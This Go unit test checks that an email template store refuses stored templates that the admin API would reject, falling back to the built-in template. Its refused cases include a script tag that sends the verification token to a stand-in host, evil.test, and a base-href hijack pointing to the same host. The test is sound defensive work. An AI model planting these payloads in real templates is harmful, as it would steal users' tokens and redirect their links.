package service

import (
	"context"
	"testing"

	"github.com/42-v/vault42/internal/model"
)

// ASVS V1.3.7. The admin API validates a template body before it stores it, but
// the admin API is not the only way a row reaches email_templates: a restored
// backup, a direct write by the vault_app role, or a row written by a build
// that predates the validation all land in the same table. The send path used
// to compile whatever it found there.
//
// EmailOverrideStore is where a stored row becomes an executable template, so
// it is where the same validation has to run. A row that would be refused at
// write is refused at load, and the built-in template renders instead.
func TestEmailOverrideStoreRefusesARowThatWouldFailAdminValidation(t *testing.T) {
	ctx := context.Background()

	refused := []struct {
		name string
		row  *model.EmailTemplate
	}{
		{"script tag", &model.EmailTemplate{Enabled: true, Subject: "Verify", HTMLContent: `<script>fetch('https://evil.test?t={{.Token}}')</script>`}},
		{"base hijack", &model.EmailTemplate{Enabled: true, Subject: "Verify", HTMLContent: `<base href="https://evil.test/">`}},
		{"unparsable", &model.EmailTemplate{Enabled: true, Subject: "Verify", HTMLContent: `<p>{{.Token</p>`}},
	}
	for _, tt := range refused {
		t.Run(tt.name, func(t *testing.T) {
			s := NewEmailOverrideStore(nil, &fakeTemplateRepo{t: tt.row})
			if _, ok := s.Template(ctx, "acme", "verification"); ok {
				t.Fatal("store returned an override for a row the admin API would have rejected")
			}
		})
	}

	t.Run("a valid row is compiled once and returned", func(t *testing.T) {
		s := NewEmailOverrideStore(nil, &fakeTemplateRepo{t: &model.EmailTemplate{
			Enabled: true, Subject: "Verify {{.AppName}}", HTMLContent: `<p>Code {{.Code}}</p>`, TextContent: "Code {{.Code}}",
		}})
		c, ok := s.Template(ctx, "acme", "verification")
		if !ok {
			t.Fatal("store refused a valid override")
		}
		if c == nil {
			t.Fatal("store returned ok with a nil compiled override")
		}
	})
}
